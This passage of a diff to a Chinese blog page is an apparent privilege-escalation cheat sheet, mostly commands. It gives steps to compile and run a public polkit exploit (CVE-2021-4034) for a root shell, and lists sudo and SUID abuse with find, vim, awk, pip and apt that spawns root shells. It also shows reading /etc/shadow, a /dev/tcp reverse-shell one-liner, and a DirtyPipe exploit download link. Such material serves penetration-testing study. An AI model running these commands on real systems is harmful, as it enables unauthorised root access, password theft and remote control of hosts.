class="hljs-number">2</span>：polkit-<span class="hljs-number">0</span>.<span class="hljs-number">115</span>-<span class="hljs-number">11</span>.el8_2.<span class="hljs-number">2</span><br>	<span class="hljs-attribute">CentOS</span> <span class="hljs-number">8</span>.<span class="hljs-number">4</span>：polkit-<span class="hljs-number">0</span>.<span class="hljs-number">115</span>-<span class="hljs-number">11</span>.el8_4.<span class="hljs-number">2</span><br>	<br><span class="hljs-attribute">Ubuntu</span>：<br>	<span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">14</span>.<span class="hljs-number">04</span> ESM：policykit-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">4</span>ubuntu<span class="hljs-number">3.14.04.6</span>+esm1<br>	<span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">04</span> ESM：policykit-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">14</span>.<span class="hljs-number">1</span>ubuntu0.<span class="hljs-number">5</span>+esm1<br>	<span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">18</span>.<span class="hljs-number">04</span> LTS：policykit-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">20</span>ubuntu<span class="hljs-number">0.18.04.6</span><br>	<span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">20</span>.<span class="hljs-number">04</span> LTS：policykit-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">26</span>ubuntu1.<span class="hljs-number">2</span><br>	<span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">21</span>.<span class="hljs-number">10</span>：policykit-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">31</span>ubuntu0.<span class="hljs-number">1</span><br>	<br><span class="hljs-attribute">Debain</span>：<br>	<span class="hljs-attribute">Debain</span> stretch：policykit-<span class="hljs-number">1</span> <span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">18</span>+deb9u2<br>	<span class="hljs-attribute">Debain</span> buster：policykit-<span class="hljs-number">1</span> <span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">25</span>+deb10u1<br>	<span class="hljs-attribute">Debain</span> bullseye：policykit-<span class="hljs-number">1</span> <span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">31</span>+deb11u1<br>	<span class="hljs-attribute">Debain</span> bookworm,bullseye：policykit-<span class="hljs-number">1</span> <span class="hljs-number">0</span>.<span class="hljs-number">105</span>-<span class="hljs-number">31</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>版本检测</p>
+<ul>
+<li><p>CentOS</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rpm -qa polkit</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Ubuntu</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dpkg</span> -l policykit-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li><p>漏洞利用项目</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://github.com/berdav/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">4034</span>.git<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>将利用文件上传到目标主机</p>
+</li>
+<li><p>在文件夹下编译</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>运行漏洞利用程序</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>运行后成功会返回一个root权限的shell，如果失败程序会自动退出，显示:</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">pkexec <span class="hljs-params">--version</span> |<br>       <span class="hljs-params">--help</span> |<br>       <span class="hljs-params">--disable-internal-agent</span> |<br>       [<span class="hljs-params">--user</span> username] PROGRAM [ARGUMENTS.<span class="hljs-string">..</span>]<br><br>See the pkexec manual page for more details.<br></code></pre></td></tr></table></figure></li>
+</ul>
 </li>
 </ul>
-<p>crontab -l -u root  &#x2F;&#x2F;需要高权限</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>低权限用户可通过查看`/etc/crontab`的方式获取<br><br></code></pre></td></tr></table></figure>
-<p>cat &#x2F;etc&#x2F;crontab</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>如果发现有root权限的计划任务，并且可文件修改，即可以进行尝试<br><br>## (<span class="hljs-number">4</span>)环境变量劫持提权<br><br>用到的命令<br><br></code></pre></td></tr></table></figure>
-<p>exploit PATH&#x3D;&#x2F;tmp:$PATH</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## (<span class="hljs-number">5</span>)Docker容器提权<br><br><br><br># 二、Windows提权<br><br>## <span class="hljs-number">1</span>、通过利用漏洞提权<br><br>利用WES-NG提权辅助工具查找可用的提权漏洞<br><br>项目地址<br><br></code></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 更新漏洞数据库<br><br></code></pre></td></tr></table></figure>
-<p>  python3 wes.py –update<br>  <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><br>+ 在目标主机上执行<span class="hljs-params">system</span>info，获取目标主机的<span class="hljs-params">system</span>info信息<br><br></code></pre></td></tr></table></figure><br>  systeminfo &gt; sysinfo.txt<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 查找提权漏洞<br><br></code></pre></td></tr></table></figure><br>  python3 wes.py ~&#x2F;tmp&#x2F;sysinfo.txt –impact “Elevation of Privilege”<br>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br>查找已有公开<span class="hljs-built_in">EXP</span>的提权漏洞<br><br></code></pre></td></tr></table></figure><br>  python3 wes.py ~&#x2F;tmp&#x2F;sysinfo.txt –impact “Elevation of Privilege” –exploits-only<br>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br># 三、服务器系统<br><br>### (一)Windows<br><br>#### <span class="hljs-number">1</span>、针对环境<br><br>#### <span class="hljs-number">2</span>、提权方法<br><br>#### <span class="hljs-number">3</span>、针对版本<br><br>### (二)Linux<br><br>#### <span class="hljs-number">1</span>、辅助工具Linux_exploit_suggester<br><br></code></pre></td></tr></table></figure><br><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 使用<br><br></code></pre></td></tr></table></figure>
-<p>  .&#x2F;linux-exploit-suggester.sh<br>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>返回结果<br><br></code></pre></td></tr></table></figure><br>  [+] [CVE-2022-0847] DirtyPipe</p>
-<pre><code class="hljs"> Details: https://dirtypipe.cm4all.com/				(漏洞介绍)
- Exposure: probable
- Tags: [ ubuntu=(20.04|21.04) ],debian=11
- Download URL: https://haxx.in/files/dirtypipez.c		(EXP下载地址)
-</code></pre>
-<pre><code class="hljs">
-</code></pre>
+<h2 id="2-通过第三方应用提权"><a href="#2-通过第三方应用提权" class="headerlink" title="(2)通过第三方应用提权"></a>(2)通过第三方应用提权</h2><h4 id="1、利用应用的suid提权"><a href="#1、利用应用的suid提权" class="headerlink" title="1、利用应用的suid提权"></a>1、利用应用的suid提权</h4><ul>
+<li><p>suid是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.。所以可以通过利用具有suid权限的第三方应用提权。</p>
+</li>
+<li><p>常见具有suid权限的Linux可执行文件</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">find</span>、<span class="hljs-keyword">vim</span>、less、<span class="hljs-keyword">cp</span>、namp、more、nano<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>通过命令寻找具有suid权限的可执行文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">find / -<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> -perm -<span class="hljs-number">4000</span> -exec ls -ldb &#123;&#125;;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>具体利用过程</p>
+<ul>
+<li><p>find的suid提权</p>
+<p>1.执行whoami</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">find / -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; -quit</span><br>root<br></code></pre></td></tr></table></figure>
+
+<p>注：如果不加<code>-quit</code>命令会多次执行，加后只执行一次后退出</p>
+<p>2.启动一个本地root权限的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure>
+
+<p>3.启动一个远程的root权限的shell</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -exec bash -ip &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span>[ip]/[port] <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> \; -quit<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>bash提权</p>
+<p>1.确定bash具有suid权限</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">&gt;ls -al /bin/bash<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1234376 </span>Feb<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>2.启动一个本地root权限的shell</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">bash -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure>
+
+<p>注：如果shell启动时有效用户(组)id不等于实际用户(组)id，在调用时提供-p选项，则启动行为(权限)相同，但有效用户id未重置。</p>
+</li>
+<li><p>vi &#x2F; vim的suid提权</p>
+<p>如果vim程序具有suid权限，可以访问<code>/etc/shadow</code>文件获取用户密码的加密值，随后使用<code>john</code>工具暴力破解或直接修改为已知密码的加密值。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>less的suid提权</p>
+<p>也是泄露<code>/etc/shadow</code>文件的内容</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">less <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>more的suid提权</p>
+<p>也是泄露<code>/etc/shadow</code>文件的内容</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">more <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>curl提权</p>
+<p>也是泄露<code>/etc/shadow</code>文件的内容</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>man提权</p>
+<p>也是泄露<code>/etc/shadow</code>文件的内容</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">man <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>mv或cp提权</p>
+<p>使用mv或使用cp的提权的原理就是制作已知密码的shadow或passwd文件，通过复制覆盖原本的<code>/etc/shadow</code>文件或<code>/etc/passwd</code>文件</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2、利用sudo命令提权"><a href="#2、利用sudo命令提权" class="headerlink" title="2、利用sudo命令提权"></a>2、利用sudo命令提权</h4><ul>
+<li><p>该方式是在低权限用户拥有运行sudo命令的权限时进行提权，该方式提权的原理和使用的某些应用很类似，但利用前提有区别。用户在使用sudo命令时需要输入当前用户密码，所以该方式需要破解到用户的密码(有时用户配置了不需要密码，该情况就很容易提权了)。在渗透时，如果发现同个可执行文件存在suid权限和使用sudo权限，那两种方式都可用；如果只存在suid权限或只存在使用sudo，那只能用相应的一种。在实际中用户的使用sudo权限有如下3种情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.全部命令都可以使用<span class="hljs-built_in">sudo</span><br>2.只有部分命令可以使用<span class="hljs-built_in">sudo</span><br>3.该用户不可使用<span class="hljs-built_in">sudo</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>通过命令获取该用户可执行sudo的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>具体利用过程</p>
+<ul>
+<li><p>find的sudo提权</p>
+<p>和find的suid提权类似，只是加多个sudo命令，随后需要输入当前用户密码即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> find / -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; -quit<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>less的sudo提权</p>
+<p>原理与less的suid提权有所不同，该方式是利用sudo命令执行less使得其获得高权限，随后在内部执行命令从而返回一个高权限的shell</p>
+<p>1.使用带sudo的less</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> less<span class="hljs-meta"> [file_name]</span><br></code></pre></td></tr></table></figure>
+
+<p>2.在less的命令行模式输入命令调用shell</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">:!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>more的sudo提权</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> more<span class="hljs-meta"> [file_name]</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>vim的sudo提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">:<span class="hljs-built_in">set</span> <span class="hljs-attribute">shell</span>=/bin/sh<br>:shell<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>nano的sudo提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">curl+<span class="hljs-built_in">T</span>		\\[^<span class="hljs-built_in">T</span>]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>man的sudo提权</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">sudo <span class="hljs-keyword">man</span> <span class="hljs-keyword">man</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>awk &#x2F; gawk &#x2F; mawk提权</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo gawk <span class="hljs-symbol">&#x27;BEGIN</span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo mawk <span class="hljs-symbol">&#x27;BEGIN</span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>env提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">env</span> /bin/sh<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>ftp提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ftp<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">!/bin/sh</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>perl提权</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo perl -e <span class="hljs-symbol">&#x27;exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;&#x27;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>tmux提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> tmux<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>apt提权</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">TF</span>=$(mktemp)<br>echo <span class="hljs-string">&#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>sudo apt-<span class="hljs-built_in">get</span> install -c <span class="hljs-variable">$TF</span> sl<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>ed提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ed<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>pip提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br><span class="hljs-built_in">sudo</span> pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>git提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> git -p <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>zip提权</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sudo zip -T --unzip-command<span class="hljs-operator">=</span><span class="hljs-string">&quot;sh -c /bin/bash&quot;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>taskset提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> taskset 1 /bin/sh -p<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>strace</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> strace -o/dev/null /bin/sh<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="3-计划任务提权"><a href="#3-计划任务提权" class="headerlink" title="(3)计划任务提权"></a>(3)计划任务提权</h2><p>查看Root用户的计划任务</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">crontab <span class="hljs-punctuation">-</span>l <span class="hljs-punctuation">-</span>u root  <span class="hljs-comment">//需要高权限</span><br></code></pre></td></tr></table></figure>
+
+<p>低权限用户可通过查看<code>/etc/crontab</code>的方式获取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/crontab<br></code></pre></td></tr></table></figure>
+
+<p>如果发现有root权限的计划任务，并且可文件修改，即可以进行尝试</p>
+<h2 id="4-环境变量劫持提权"><a href="#4-环境变量劫持提权" class="headerlink" title="(4)环境变量劫持提权"></a>(4)环境变量劫持提权</h2><p>用到的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="5-Docker容器提权"><a href="#5-Docker容器提权" class="headerlink" title="(5)Docker容器提权"></a>(5)Docker容器提权</h2><h1 id="二、Windows提权"><a href="#二、Windows提权" class="headerlink" title="二、Windows提权"></a>二、Windows提权</h1><h2 id="1、通过利用漏洞提权"><a href="#1、通过利用漏洞提权" class="headerlink" title="1、通过利用漏洞提权"></a>1、通过利用漏洞提权</h2><p>利用WES-NG提权辅助工具查找可用的提权漏洞</p>
+<p>项目地址</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/bitsadmin/</span>wesng<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>更新漏洞数据库</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> wes.<span class="hljs-keyword">py</span> --<span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在目标主机上执行systeminfo，获取目标主机的systeminfo信息</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">systeminfo</span> &gt; sysinfo.txt<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查找提权漏洞</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 wes<span class="hljs-selector-class">.py</span> ~/tmp/sysinfo<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--impact</span> <span class="hljs-string">&quot;Elevation of Privilege&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>查找已有公开EXP的提权漏洞</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 wes<span class="hljs-selector-class">.py</span> ~/tmp/sysinfo<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--impact</span> <span class="hljs-string">&quot;Elevation of Privilege&quot;</span> <span class="hljs-attr">--exploits-only</span><br></code></pre></td></tr></table></figure></li>
+</ul>
